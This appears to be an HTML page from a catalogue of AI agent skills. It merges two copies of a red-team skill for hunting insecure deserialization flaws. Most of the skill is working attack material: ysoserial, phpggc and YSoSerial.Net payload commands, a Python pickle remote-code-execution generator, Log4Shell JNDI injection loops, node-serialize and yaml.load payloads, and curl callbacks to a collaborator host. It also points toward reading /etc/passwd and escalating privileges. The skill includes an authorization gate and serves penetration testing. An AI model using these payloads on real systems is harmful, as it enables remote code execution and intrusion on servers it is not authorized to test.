@@ -1,0 +1,231 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>hunt-deserialization</title>
+<style>
+body { font: 14px/1.45 ui-monospace, monospace; margin: 1.5rem; }
+a { color: #0645ad; }
+table { border-collapse: collapse; width: 100%; }
+th, td { text-align: left; padding: 0.2rem 0.7rem 0.2rem 0; vertical-align: top; }
+th { border-bottom: 1px solid #ccc; }
+.crumbs { margin-bottom: 1rem; }
+.meta { color: #444; }
+pre { white-space: pre-wrap; background: #f6f6f6; padding: 0.8rem; }
+</style>
+</head>
+<body>
+<p class="crumbs"><a href="../../index.html">domains</a> / <a href="../index.html">security</a> / <a href="index.html">hunt-insecure-deserialization</a> / hunt-deserialization</p><h1>hunt-deserialization</h1><p class="meta">combined</p><p>Both copies share the same core procedure (Java ysoserial, PHP phpggc, Python pickle, .NET ViewState, Log4Shell/JNDI, Ruby Marshal) and the same detection signals. The sickn33 copy adds a mandatory authorization gate and extra deserialization vectors (PHP phar://, Python yaml.load, Node node-serialize) that the uphiago copy lacks. The uphiago copy adds a Verification section and slightly different curl timeout flags. Crowning one would hide the authorization gate and the extra vectors, so the copies should be combined.</p><h2>Repositories</h2><table><thead><tr><th>Repository</th><th>Path</th></tr></thead><tbody><tr><td><a href="https://github.com/uphiago/recon-skills">uphiago/recon-skills</a></td><td><code>redteam/hunt-deserialization/SKILL.md</code></td></tr><tr><td><a href="https://github.com/sickn33/agentic-awesome-skills">sickn33/agentic-awesome-skills</a></td><td><code>plugins/agentic-awesome-skills-claude/skills/hunt-deserialization/SKILL.md</code></td></tr></tbody></table><h2>Other copies</h2><table><thead><tr><th>Role</th><th>Repository</th><th>Path</th></tr></thead><tbody><tr><td>peer</td><td><a href="https://github.com/uphiago/recon-skills">uphiago/recon-skills</a></td><td><code>redteam/hunt-deserialization/SKILL.md</code></td></tr><tr><td>peer</td><td><a href="https://github.com/sickn33/agentic-awesome-skills">sickn33/agentic-awesome-skills</a></td><td><code>plugins/agentic-awesome-skills-claude/skills/hunt-deserialization/SKILL.md</code></td></tr><tr><td>adapter</td><td><a href="https://github.com/sickn33/agentic-awesome-skills">sickn33/agentic-awesome-skills</a></td><td><code>plugins/agentic-awesome-skills/skills/hunt-deserialization/SKILL.md</code></td></tr><tr><td>adapter</td><td><a href="https://github.com/sickn33/agentic-awesome-skills">sickn33/agentic-awesome-skills</a></td><td><code>skills/hunt-deserialization/SKILL.md</code></td></tr></tbody></table><h2>Combined skill</h2><pre>---
+name: hunt-deserialization
+description: Hunt Insecure Deserialization — Java gadget chains (ysoserial), PHP object injection (phpggc), Python pickle RCE, .NET BinaryFormatter, Ruby Marshal.load, JNDI/Log4Shell, PHP phar://, Python yaml.load, Node node-serialize. RCE via deserialization is almost always Critical. Use when target runs Java, PHP serialization, Python pickle, .NET, or Ruby on Rails.
+version: 1.2.0
+license: MIT
+category: redteam
+tags: [deserialization, hunt, redteam]
+---
+
+# HUNT-DESERIALIZATION — Insecure Deserialization
+
+&gt; **⚠️ AUTHORIZED USE ONLY**
+&gt; This skill is for educational purposes or authorized security assessments only.
+&gt; You must have explicit, written permission from the system owner before using this tool.
+&gt; Misuse of this tool is illegal and strictly prohibited.
+
+&gt; **Mandatory confirmation gate**
+&gt; Before running any command that probes, exploits, changes, persists on, extracts data from, or attempts credential access against a target:
+&gt; 1. Ask the user to state the exact target URL, IP, account, or resource.
+&gt; 2. Ask the user to confirm written authorization and the permitted scope.
+&gt; 3. Show the exact command(s) and explain their expected effect.
+&gt; 4. Wait for explicit confirmation in the current conversation.
+&gt;
+&gt; Without that confirmation, remain read-only and provide defensive guidance only. Prefer a sandbox, disposable VM, or controlled lab.
+
+## Crown Jewel Targets
+
+Deserialization bugs are almost always Critical — they lead directly to RCE without prerequisite conditions.
+
+**Highest-value chains:**
+- **Java ysoserial gadget chains** — CommonsCollections, Spring, JNDI, Groovy gadgets → full OS command execution
+- **PHP Object Injection** — `__wakeup` / `__destruct` magic methods → file write / RCE
+- **Python pickle** — `pickle.loads(attacker_data)` → `__reduce__` → `os.system(&#x27;id&#x27;)`
+- **.NET BinaryFormatter** — TypeConfuseDelegate gadget chain → RCE
+- **Ruby Marshal.load** — Gem::Requirement, Gem::Installer gadgets → RCE
+- **JNDI injection** — Log4Shell pattern: `${jndi:ldap://attacker/a}` → class load → RCE
+
+---
+
+## Attack Surface Signals
+
+### Detection Patterns
+```bash
+# Java serialized objects start with AC ED 00 05 (hex) or rO0A (base64)
+echo &quot;rO0ABXQ=&quot; | base64 -d | xxd | head -1  # shows: ac ed 00 05
+
+# PHP serialization: O:8:&quot;stdClass&quot;:0:{}
+# Python pickle: starts with \x80\x04 (protocol 4) or \x80\x02
+
+# Apache Shiro: rememberMe cookie present
+curl --max-time 30 --connect-timeout 10 -sI https://$TARGET/ | grep -i &quot;Set-Cookie.*rememberMe&quot;
+
+# Log4j: test user-controlled fields for JNDI interpolation
+curl --max-time 30 --connect-timeout 10 -H &#x27;User-Agent: ${jndi:dns://COLLAB_HOST/a}&#x27; https://$TARGET/
+```
+
+### Header / Cookie Signals
+```
+Content-Type: application/x-java-serialized-object
+Cookie containing rO0= prefix (Java base64 serialized)
+Cookie: rememberMe= (Apache Shiro)
+Cookie: _VIEWSTATE (ASP.NET ViewState without encryption)
+Endpoints: /remoting/, /invoker/, /jmx-console/, /wls-wsat/
+```
+
+---
+
+## Step-by-Step Hunting Methodology
+
+### Phase 1 — Java Deserialization (ysoserial)
+```bash
+# Install ysoserial
+wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar
+
+# Generate OOB detection payload
+java -jar ysoserial-all.jar CommonsCollections6 \
+  &#x27;curl http://COLLAB_HOST/ysoserial&#x27; | base64 -w0
+
+# Send as body or cookie
+java -jar ysoserial-all.jar CommonsCollections6 &#x27;id &gt; /tmp/pwned&#x27; | base64 | \
+  curl --max-time 30 --connect-timeout 10 -s https://$TARGET/wls-wsat/CoordinatorPortType \
+    -H &quot;Content-Type: application/x-java-serialized-object&quot; \
+    --data-binary @-
+
+# Apache Shiro exploit (default AES key)
+python3 shiro_exploit.py -u https://$TARGET/ -c &quot;id&quot;
+```
+
+### Phase 2 — PHP Object Injection
+```bash
+# Find unserialize() calls in source
+grep -r &quot;unserialize(&quot; --include=&quot;*.php&quot; .
+
+# Inject test: O:8:&quot;stdClass&quot;:1:{s:4:&quot;test&quot;;s:5:&quot;value&quot;;}
+# Send in cookie, POST param, or hidden form field
+# If error changes → deserialization confirmed
+
+# Craft gadget chain using phpggc
+git clone https://github.com/ambionics/phpggc
+php phpggc -l  # list chains
+php phpggc Laravel/RCE5 system id | base64
+```
+
+### Phase 3 — Python Pickle
+```bash
+# Generate OOB payload
+python3 -c &quot;
+import pickle, os, base64
+class Exploit(object):
+    def __reduce__(self):
+        return (os.system, (&#x27;curl http://COLLAB_HOST/pickle-rce&#x27;,))
+print(base64.b64encode(pickle.dumps(Exploit())).decode())
+&quot;
+
+# Send as cookie or POST body
+curl --max-time 30 --connect-timeout 10 -s https://$TARGET/api/load-model \
+  -H &quot;Content-Type: application/octet-stream&quot; \
+  --data-binary @payload.pkl
+```
+
+### Phase 3b — PHP phar://, Python YAML, Node deserialization
+- **PHP phar:// (no `unserialize()` call)** — any filesystem function (`file_exists`/`fopen`/`getimagesize`) on a `phar://` path deserializes the archive metadata -&gt; object injection with zero `unserialize()` in code.
+  ```bash
+  phpggc -p phar -o poly.jpg Monolog/RCE1 system id   # valid-image + phar polyglot
+  # then reach  phar://uploads/poly.jpg/x  via any fs call
+  ```
+- **Python `yaml.load()` (CVE-2017-18342)** — pre-5.1 default-unsafe:
+  `!!python/object/apply:os.system [&#x27;curl http://$COLLAB/yaml&#x27;]`
+- **Node `node-serialize` (CVE-2017-5941)** — IIFE marker in any field passed to `unserialize()`:
+  `{&quot;rce&quot;:&quot;_$$ND_FUNC$$_function(){require(&#x27;child_process&#x27;).exec(&#x27;curl http://$COLLAB/node&#x27;)}()&quot;}`
+
+### Phase 4 — .NET ViewState
+```bash
+# Check if ViewState is unsigned (MAC disabled)
+# Look for __VIEWSTATE in HTML source without __VIEWSTATEMAC
+
+# YSoSerial.Net
+dotnet YSoSerial.exe -f BinaryFormatter -g TypeConfuseDelegate \
+  -c &quot;cmd /c curl http://COLLAB_HOST/viewstate-rce&quot; -o base64
+```
+
+### Phase 5 — Log4Shell / JNDI
+```bash
+# Test all user-controlled inputs
+COLLAB=&quot;COLLAB_HOST&quot;
+for HEADER in &quot;User-Agent&quot; &quot;X-Forwarded-For&quot; &quot;Referer&quot; &quot;X-Api-Version&quot; &quot;Accept-Language&quot;; do
+  curl --max-time 30 --connect-timeout 10 -s https://$TARGET/ -H &quot;$HEADER: \${jndi:dns://$COLLAB/$HEADER}&quot; &amp;
+done
+
+# Test POST body fields
+curl --max-time 30 --connect-timeout 10 -s -X POST https://$TARGET/api/login \
+  -H &quot;Content-Type: application/json&quot; \
+  -d &quot;{\&quot;username\&quot;: \&quot;\${jndi:ldap://$COLLAB/a}\&quot;}&quot;
+```
+
+### Phase 6 — Ruby Marshal
+```bash
+# Look for Marshal.load in source
+grep -r &quot;Marshal.load\|Marshal.restore&quot; --include=&quot;*.rb&quot; .
+
+# Gem::Requirement gadget chain via marshalable objects
+# Use ruby-advisory-db gadgets
+```
+
+---
+
+## Chain Table
+
+| Deserialization signal | Chain to | Impact |
+|-----------------------|----------|--------|
+| Any deser RCE | /etc/passwd + id output | Prove arbitrary command execution |
+| RCE as low-privilege user | Find SUID binaries / sudo rules | Privilege escalation → root |
+| Blind RCE (OOB callback) | DNS callback → confirm exec | Sufficient for Critical PoC |
+| Log4Shell | LDAP → JNDI → class load | Full RCE on JVM process |
+
+---
+
+## Automation
+```bash
+# OOB listener
+interactsh-client -v -n 5
+
+# JNDI exploit kit
+git clone https://github.com/pimps/JNDI-Exploit-Kit
+```
+
+---
+
+## Validation
+
+✅ DNS/HTTP callback from COLLAB host: blind deserialization confirmed
+✅ Command output in response: full RCE confirmed
+
+**Severity:** Almost always **Critical** — RCE with server process privileges.
+
+## Verification
+
+1. **ysoserial availability** — check if ysoserial is installed:
+   ```bash
+   which ysoserial 2&gt;/dev/null || ls /opt/ysoserial*.jar 2&gt;/dev/null | head -1 &amp;&amp; echo &quot;PASS: ysoserial found&quot; || echo &quot;NOTE: ysoserial not installed&quot;
+   ```
+2. **PHP deserialization test** — verify PHP payload generation:
+   ```bash
+   php -r &quot;echo serialize([&#x27;test&#x27;=&gt;&#x27;value&#x27;]);&quot; 2&gt;/dev/null &amp;&amp; echo &quot;PASS: PHP serialize works&quot; || echo &quot;NOTE: PHP not available&quot;
+   ```
+
+## Conflicts
+
+- **sickn33/agentic-awesome-skills** includes a mandatory authorization confirmation gate before any probing command; **uphiago/recon-skills** does not include this gate. The combined instruction includes the gate.
+- **sickn33/agentic-awesome-skills** includes Phase 3b covering PHP phar://, Python yaml.load, and Node node-serialize; **uphiago/recon-skills** does not include these vectors. The combined instruction includes Phase 3b.
+- **uphiago/recon-skills** includes a Verification section with ysoserial and PHP serialize checks; **sickn33/agentic-awesome-skills** does not include this section. The combined instruction includes the Verification section.
+- **uphiago/recon-skills** uses `--max-time 30 --connect-timeout 10` on curl commands; **sickn33/agentic-awesome-skills** omits these timeout flags. The combined instruction uses the timeout flags from uphiago/recon-skills.</pre>
+</body>
+</html>
